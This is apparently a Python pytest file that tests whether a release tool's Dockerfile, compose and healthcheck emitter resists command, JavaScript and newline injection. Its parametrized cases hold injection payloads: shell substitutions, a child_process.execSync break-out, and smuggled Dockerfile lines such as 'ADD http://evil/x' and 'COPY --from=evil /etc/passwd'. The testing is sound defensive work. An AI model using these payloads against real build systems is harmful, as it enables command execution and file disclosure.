"""WO-C5 red matrix (part 2) — injection reaching the EMITTED self-host bytes.

Plan §9 (WO-C5) — the RENDERING-boundary half: prove that command / health / path
injection can never be lowered UNSAFELY into the generated `Dockerfile` /
`compose.yaml` / healthcheck program. This is the "representation/rendering
boundary must be safe by construction" guarantee the §9 forbidden-shortcut calls
out. The declaration-boundary rejections live in the tools sibling
`test_c5_injection_reject.py`.

Criteria encoded here:
  * §9.10 — a `$`-bearing argv token is never pasted unquoted into emitted shell
    source (the behavioral proxy for "no `if token contains $, paste it unquoted`
    helper"): the raw token must not survive into an emitted `sh -c` string.
  * §9.7 — an accepted health path round-trips EXACTLY as data (verbatim in the
    emitted healthcheck), while a metacharacter health path can never alter the
    healthcheck PROGRAM.
  * §9.6 — a malicious service `root` / `output_dir` can never add a `RUN` /
    `ADD` / `COPY --from` / second Dockerfile line, and a COPY source can never
    become absolute / traversing.

Boundary (plan §1.2 / §4 crit 3+4):
  * §9.10 / §9.7 drive the REAL public route boundary — a real FastAPI app, a real
    `ProjectStore` on a real on-disk workspace with a real committed version, then
    `GET /release` → `GET /download` — and inspect the REAL emitted zip bytes. The
    ONLY seam is `ConfigStore.load` (a config seam, exactly the settings PUT's
    injection). The malicious intent is planted as RAW sidecar JSON so the test is
    robust to the fix hardening `ReleaseIntent` (a typed construction would itself
    raise post-fix): the REAL route/detector/validator/emitter decide the outcome.
  * §9.6 drives the REAL emitter `emit_local_compose` directly. A malicious `root`
    / `output_dir` is NOT reachable through the `ReleaseIntent` the tool accepts
    (those are derived `ReleaseService` fields), so the reachable §9.6 contract is
    the emitter's own safe-by-construction rendering. The adversarial spec is built
    with pydantic's non-validating `model_copy(update=...)` — the exact
    `model_copy`/`model_construct` path the validation plane's own docstring says
    must be judged honestly — feeding the REAL emitter. No mock/patch/fake anywhere.

RED vs GREEN on baseline `2ec1ceba` (empirically probed):
  * RED — a declared `start_cmd` token `$(touch …)` is lowered by `_shell_join`
    verbatim into `CMD ["sh","-c","exec … $(touch …)"]`; a `/x');require('child_'
    …` health path is pasted straight into the node healthcheck `-e` program; a
    `root`/`output_dir` carrying a newline / absolute path emits a new `RUN`/
    `COPY`/`ADD` line or an absolute COPY source.
  * GREEN — an accepted health path (`/healthz/…`) already round-trips verbatim as
    data in the emitted healthcheck.

DEFERRED (plan §9.9): the real-container canary (a running container proving no
sentinel file/process/network/log was created by rejected input) belongs to the
C8/live lane and is NOT faked here — a passing byte-inspection is necessary but not
sufficient for §9.9.

Randomized (plan §4 crit 8): conversation ids come from the seeded `closeout_name`
factory; the detector reads workspace-relative file contents only, never the id.
"""

from __future__ import annotations

import io
import json
import zipfile
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from disco.agent_server import ConversationRuntime, create_app
from disco.core import SqliteEventStore
from disco.core.llm import ConfigStore, ProjectStorageSettings, RouterConfig
from disco.core.release.local_compose import COMPOSE_PATH, DOCKERFILE_PATH, emit_local_compose
from disco.core.release.spec import (
    DetectorProvenance,
    ReleaseAssessment,
    ReleaseIntent,
    ReleaseService,
    ReleaseSpec,
    RuntimeStrategy,
    ServiceRole,
)
from disco.tools.projects import ProjectStore
from fastapi import FastAPI
from fastapi.testclient import TestClient
from pydantic import ValidationError

pytestmark = pytest.mark.export_track1_closeout

_NODE_FILES: dict[str, bytes] = {
    "server.js": b"require('http').createServer((_q,r)=>r.end('ok')).listen(process.env.PORT);\n",
    "package.json": b'{"name":"svc","scripts":{"start":"node server.js"}}',
}


# ---- real ASGI app + real ProjectStore (only ConfigStore.load is seamed) --------


@pytest.fixture
def _store() -> Iterator[SqliteEventStore]:
    yield SqliteEventStore(":memory:")


def _app_and_store(
    store: SqliteEventStore, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> tuple[FastAPI, ProjectStore]:
    cfg = RouterConfig.model_validate(
        {
            "models": {"m": {"model_id": "m", "provider": "fake", "context_window": 8192}},
            "default_model": "m",
        }
    )
    cfg = cfg.model_copy(update={"projects": ProjectStorageSettings(projects_root=str(tmp_path))})
    cfg_store = ConfigStore(path=Path("/dev/null"))
    monkeypatch.setattr(cfg_store, "load", lambda: cfg)
    runtime = ConversationRuntime(store, config=cfg, config_store=cfg_store)
    return create_app(store, runtime=runtime), ProjectStore(str(tmp_path))


def _client(
    store: SqliteEventStore, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> tuple[TestClient, ProjectStore]:
    app, ps = _app_and_store(store, tmp_path, monkeypatch)
    return TestClient(app), ps


def _cid(make_name: object, prefix: str) -> str:
    """A seeded id in the canonical `conv_` namespace the release route requires."""
    assert callable(make_name)
    return str(make_name(prefix))


def _seed(
    ps: ProjectStore,
    store: SqliteEventStore,
    cid: str,
    title: str,
    *,
    intent: ReleaseIntent | None = None,
    raw_intent: dict[str, Any] | None = None,
) -> None:
    """Seed a real on-disk node workspace + manifest, an optional host-owned release
    intent (typed OR raw JSON bytes), a conversation record, and a committed version 1
    so the live tree matches a `VersionRecord` and detection can run over a real
    candidate.

    `raw_intent` writes the sidecar JSON DIRECTLY (a fixture seam, not the tool): it
    plants a token the tool's `ReleaseIntent` would reject AFTER the fix, so the RED is
    driven by the real route/detector/emitter rather than by a Python-level
    construction that would itself raise once the schema is hardened."""
    workspace = ps.path_for(cid)
    workspace.mkdir(parents=True, exist_ok=True)
    total = 0
    for rel, data in _NODE_FILES.items():
        dest = workspace / rel
        dest.parent.mkdir(parents=True, exist_ok=True)
        dest.write_bytes(data)
        total += len(data)
    ps.write_manifest(
        cid,
        title=title,
        owner_id="local",
        created_at="2026-06-06T00:00:00Z",
        file_count=len(_NODE_FILES),
        total_bytes=total,
        imported=False,
    )
    if intent is not None:
        ps.write_release_intent(cid, intent)
    if raw_intent is not None:
        ps.release_intent_for(cid).write_text(json.dumps(raw_intent))
    store.create_conversation(cid, owner_id="local", title=title, surface="build")
    cut = ps.cut_version(cid, trigger="closeout")
    assert cut is not None and cut.seq == 1, "precondition: a real version 1 was committed"


def _emitted_overlay_texts(client: TestClient, cid: str) -> dict[str, str]:
    """The emitted `Dockerfile` / `compose.yaml` TEXT from the project's `/download`
    zip — but ONLY when the project is a self-hostable `candidate` (so an overlay is
    actually emitted). A fail-closed `needs_review` (the SAFE post-fix outcome) emits
    no overlay, so this returns `{}` and the injection is definitionally absent."""
    rel = client.get(f"/api/projects/{cid}/release")
    if rel.status_code != 200 or rel.json().get("assessment") != "candidate":
        return {}
    dl = client.get(f"/api/projects/{cid}/download")
    if dl.status_code != 200:
        return {}
    texts: dict[str, str] = {}
    with zipfile.ZipFile(io.BytesIO(dl.content)) as zf:
        present = set(zf.namelist())
        for name in (DOCKERFILE_PATH, COMPOSE_PATH):
            if name in present:
                texts[name] = zf.read(name).decode("utf-8", "replace")
    return texts


# ===========================================================================
# §9.10 — a `$`-bearing argv token is never pasted unquoted into emitted shell
# source. RED on baseline (`_shell_join` passes `$`-tokens through verbatim into
# `sh -c 'exec …'`).
# ===========================================================================

_ARGV_DOLLAR_INJECTIONS: list[tuple[str, str]] = [
    ("cmd_subst", "$(touch /tmp/pwn_C5SENT10)"),
    ("cmd_subst_embedded", "server.js$(touch /tmp/pwn_C5SENT10)"),
    ("brace_default_subst", "${PORT:-$(touch /tmp/pwn_C5SENT10)}"),
]


@pytest.mark.parametrize(
    "case_id,token", _ARGV_DOLLAR_INJECTIONS, ids=[c[0] for c in _ARGV_DOLLAR_INJECTIONS]
)
def test_argv_dollar_token_not_pasted_unquoted_into_shell_source(
    case_id: str,
    token: str,
    _store: SqliteEventStore,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    closeout_name: object,
) -> None:
    """WO-C5 §9.10 — RED on baseline.

    A declared start-command token carrying `$` must never be lowered verbatim into a
    generated `sh -c` string. Baseline's `_exec_or_shell`/`_shell_join` wrap any
    `$`-bearing argv in `sh -c 'exec …'` and pass the token THROUGH unquoted, so
    `$(touch …)` becomes live command substitution in the emitted `Dockerfile` CMD.
    The fix must fail such an intent closed (no overlay) or render it inert — either
    way the raw token/sentinel must not appear in emitted shell source."""
    cid = _cid(closeout_name, "conv_c5dollar")
    client, ps = _client(_store, tmp_path, monkeypatch)
    _seed(ps, _store, cid, _cid(closeout_name, "proj"), raw_intent={"start_cmd": ["node", token]})

    for name, text in _emitted_overlay_texts(client, cid).items():
        assert token not in text and "C5SENT10" not in text, (
            f"[{case_id}] the argv token {token!r} was pasted unquoted into the emitted "
            f"{name} shell source; WO-C5 §9.10 forbids any 'if token contains $, paste it "
            "unquoted into shell source' rendering (baseline lowers it into `sh -c 'exec …'`)."
        )


# ===========================================================================
# §9.7 — health path round-trips EXACTLY as data (GREEN), and a metacharacter
# health path can never alter the healthcheck PROGRAM (RED on baseline).
# ===========================================================================


def test_accepted_health_path_round_trips_verbatim_as_data(
    _store: SqliteEventStore,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    closeout_name: object,
) -> None:
    """WO-C5 §9.7 (positive) — GREEN preservation.

    An accepted health path is passed as DATA into the emitted healthcheck program and
    must appear VERBATIM (here `/healthz/c5probe` inside the compose healthcheck URL).
    Green on baseline; the fix must keep an accepted path round-tripping exactly."""
    cid = _cid(closeout_name, "conv_c5hpok")
    client, ps = _client(_store, tmp_path, monkeypatch)
    intent = ReleaseIntent(start_cmd=("node", "server.js"), health_path="/healthz/c5probe")
    _seed(ps, _store, cid, _cid(closeout_name, "proj"), intent=intent)

    rel = client.get(f"/api/projects/{cid}/release")
    assert rel.status_code == 200, rel.text
    assert rel.json()["assessment"] == "candidate", "a node intent + health path is a candidate"

    texts = _emitted_overlay_texts(client, cid)
    compose = texts.get(COMPOSE_PATH, "")
    assert "/healthz/c5probe" in compose, (
        "the accepted health path did not round-trip verbatim as data into the emitted "
        f"compose healthcheck; saw:\n{compose[:400]}"
    )


_HEALTH_INJECTIONS: list[tuple[str, str]] = [
    ("js_break_execSync", "/x');require('child_process').execSync('touch /tmp/pwn_C5SENT7');(('"),
    ("cmd_subst", "/x$(touch /tmp/pwn_C5SENT7)"),
    ("quote_break", "/x',()=>1);process.mainModule.require('C5SENT7');(('"),
]


@pytest.mark.parametrize(
    "case_id,health_path", _HEALTH_INJECTIONS, ids=[c[0] for c in _HEALTH_INJECTIONS]
)
def test_metacharacter_health_path_cannot_alter_healthcheck_program(
    case_id: str,
    health_path: str,
    _store: SqliteEventStore,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    closeout_name: object,
) -> None:
    """WO-C5 §9.7 (negative) — RED on baseline.

    A metacharacter health path must never alter the emitted healthcheck PROGRAM.
    Baseline pastes the path straight into the node `-e` script string, so
    `/x');require('child_process')…` injects live JavaScript into the healthcheck. The
    fix must fail it closed (no overlay) or emit it as inert data — the injected code
    marker (`child_process` / `require` / the sentinel) must never appear in the
    emitted program."""
    cid = _cid(closeout_name, "conv_c5hpinj")
    client, ps = _client(_store, tmp_path, monkeypatch)
    _seed(
        ps,
        _store,
        cid,
        _cid(closeout_name, "proj"),
        raw_intent={"start_cmd": ["node", "server.js"], "health_path": health_path},
    )

    for name, text in _emitted_overlay_texts(client, cid).items():
        assert "C5SENT7" not in text and "child_process" not in text, (
            f"[{case_id}] a metacharacter health path altered the emitted {name} healthcheck "
            "program; WO-C5 §9.7 requires the health path to be DATA in a restricted grammar, "
            "never pasted into the probe source (baseline injects it into the node `-e` script)."
        )


# ===========================================================================
# §9.6 — a malicious service root / output_dir can never add a new Dockerfile
# instruction (RUN / ADD / COPY --from / second line) or an out-of-context COPY
# source. RED on baseline (`_copy_line` / `_static_dockerfile` interpolate the
# raw path into the emitted `COPY`/build source).
# ===========================================================================


def _node_base_spec() -> ReleaseSpec:
    service = ReleaseService(
        id="web",
        role=ServiceRole.ingress,
        runtime=RuntimeStrategy.node,
        start_cmd=("node", "server.js"),
        port_env="PORT",
    )
    provenance = DetectorProvenance(
        detector="closeout-c5", detector_version="1", assessment=ReleaseAssessment.candidate
    )
    return ReleaseSpec(
        kind="node",
        name="app",
        version_seq=1,
        tree_digest="a" * 64,
        services=(service,),
        provenance=provenance,
    )


def _static_base_spec() -> ReleaseSpec:
    service = ReleaseService(
        id="web",
        role=ServiceRole.ingress,
        runtime=RuntimeStrategy.static,
        build_cmd=("npm", "run", "build"),
        output_dir="dist",
        port_env="PORT",
    )
    provenance = DetectorProvenance(
        detector="closeout-c5", detector_version="1", assessment=ReleaseAssessment.candidate
    )
    return ReleaseSpec(
        kind="static",
        name="app",
        version_seq=1,
        tree_digest="a" * 64,
        services=(service,),
        provenance=provenance,
    )


def _emit_or_none(spec: ReleaseSpec) -> dict[str, str] | None:
    """Run the REAL emitter over an adversarial spec. A fail-closed emission (the
    validator revalidation inside `serialize_release_spec` rejecting a malicious
    path) is an acceptable SAFE outcome — return `None` so the injection is
    definitionally absent from any emitted byte."""
    try:
        return emit_local_compose(spec)
    except (ValueError, ValidationError):
        return None


def _assert_no_injected_dockerfile_instruction(dockerfile: str, *, marker: str, what: str) -> None:
    """No emitted Dockerfile line may (A) become a NEW `RUN`/`ADD`/`COPY --from`
    instruction carrying the injected marker, nor (B) carry an ABSOLUTE or traversing
    COPY source. On baseline the malicious path splits the emitted `COPY` line into a
    second instruction (or an absolute source), tripping one of these."""
    for line in dockerfile.splitlines():
        stripped = line.strip()
        assert not (stripped.startswith(("RUN ", "ADD ", "COPY --from=")) and marker in stripped), (
            f"a malicious {what} added a new Dockerfile instruction line {line!r}; WO-C5 §9.6 "
            "forbids user/model text from creating a new RUN/ADD/COPY --from/stage line."
        )
        if stripped.startswith("COPY ") and not stripped.startswith("COPY --from="):
            parts = stripped.split()
            if len(parts) >= 2:
                source = parts[1]
                assert not source.startswith("/"), (
                    f"a malicious {what} produced an ABSOLUTE COPY source {source!r} that escapes "
                    "the build context; WO-C5 §9.6 requires normalized workspace-relative paths."
                )
                assert ".." not in source.split("/"), (
                    f"a malicious {what} produced a traversing COPY source {source!r}; WO-C5 §9.6 "
                    "requires normalized workspace-relative paths."
                )


_ROOT_INJECTIONS: list[tuple[str, str]] = [
    ("newline_run", "app\nRUN touch /pwn_C5SENT6"),
    ("newline_copy_from", "app\nCOPY --from=evil /etc/passwd /pwn_C5SENT6"),
    ("newline_add", "app\nADD http://evil/x /pwn_C5SENT6"),
    ("absolute", "/etc/C5SENT6"),
]


@pytest.mark.parametrize("case_id,root", _ROOT_INJECTIONS, ids=[c[0] for c in _ROOT_INJECTIONS])
def test_malicious_service_root_cannot_inject_dockerfile_instruction(
    case_id: str,
    root: str,
) -> None:
    """WO-C5 §9.6 (root) — RED on baseline.

    A service `root` is interpolated into `COPY <root>/ ./`. A root carrying a newline
    splits that into a second `RUN`/`ADD`/`COPY --from` line; an absolute root emits an
    absolute COPY source that escapes the build context. Baseline's `_reject_traversal`
    only blocks NUL / `..`, so both slip through into the emitted Dockerfile."""
    base = _node_base_spec()
    bad_service = base.services[0].model_copy(update={"root": root})
    bad_spec = base.model_copy(update={"services": (bad_service,)})

    overlay = _emit_or_none(bad_spec)
    if overlay is None:
        return  # fail-closed emission — the injection cannot appear
    _assert_no_injected_dockerfile_instruction(
        overlay.get(DOCKERFILE_PATH, ""), marker="C5SENT6", what=f"service root [{case_id}]"
    )


_OUTPUT_DIR_INJECTIONS: list[tuple[str, str]] = [
    ("newline_run", "dist\nRUN touch /pwn_C5SENT6"),
    ("newline_copy_from", "dist\nCOPY --from=evil /etc/passwd /pwn_C5SENT6"),
]


@pytest.mark.parametrize(
    "case_id,output_dir", _OUTPUT_DIR_INJECTIONS, ids=[c[0] for c in _OUTPUT_DIR_INJECTIONS]
)
def test_malicious_output_dir_cannot_inject_dockerfile_instruction(
    case_id: str,
    output_dir: str,
) -> None:
    """WO-C5 §9.6 (output_dir) — RED on baseline.

    A static build's `output_dir` is interpolated into the two-stage `COPY --from=build
    /app/<output_dir>/ /site/` line. An `output_dir` carrying a newline splits that into
    a new `RUN`/`COPY --from` instruction. Baseline only blocks NUL / `..`, so the
    injected line reaches the emitted Dockerfile."""
    base = _static_base_spec()
    bad_service = base.services[0].model_copy(update={"output_dir": output_dir})
    bad_spec = base.model_copy(update={"services": (bad_service,)})

    overlay = _emit_or_none(bad_spec)
    if overlay is None:
        return  # fail-closed emission — the injection cannot appear
    _assert_no_injected_dockerfile_instruction(
        overlay.get(DOCKERFILE_PATH, ""), marker="C5SENT6", what=f"output_dir [{case_id}]"
    )
